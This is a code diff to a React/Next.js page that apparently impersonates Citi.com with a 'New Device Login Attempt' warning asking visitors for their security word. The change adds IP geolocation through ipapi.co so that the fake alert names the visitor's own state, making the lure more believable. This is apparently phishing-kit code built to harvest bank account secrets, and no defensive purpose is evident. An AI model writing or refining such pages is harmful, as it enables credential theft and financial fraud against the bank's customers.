@@ -4,16 +4,32 @@ import Footer from "@/components/layout/Footer";
 import Header from "@/components/layout/Header";
 import axios from "axios";
 import { useRouter } from "next/navigation";
-import React, { useState } from "react";
-
-// export const metadata = {
-//   title: "New Device Attempt | Citi.com",
-// };
+import React, { useEffect, useState } from "react";
 
 const Page = () => {
   const [securityWord, setSecurityWord] = useState("");
   const [loading, setLoading] = useState(false);
+  const [userLocation, setUserLocation] = useState("your device"); // Default fallback
   const router = useRouter();
+
+  // --------------- Detect User's State ---------------
+  useEffect(() => {
+    const fetchLocation = async () => {
+      try {
+        // Using ipapi.co for free IP geolocation
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        if (data && data.region) {
+          setUserLocation(data.region); // Show US State or Region
+        }
+      } catch (err) {
+        console.error("⚠️ Location fetch failed:", err);
+      }
+    };
+
+    fetchLocation();
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -39,8 +55,8 @@ const Page = () => {
             New Device Login Attempt
           </h1>
           <p className="text-sm text-gray-700 mb-6 leading-relaxed">
-            We recently noticed a new login to your account from an{" "}
-            <span className="font-semibold">Apple iPhone 14 Pro</span>. If this
+            We recently noticed a new login to your account from{" "}
+            <span className="font-semibold">{userLocation}</span>. If this
             was you, please confirm to continue enjoying the benefits of your
             account.
           </p>
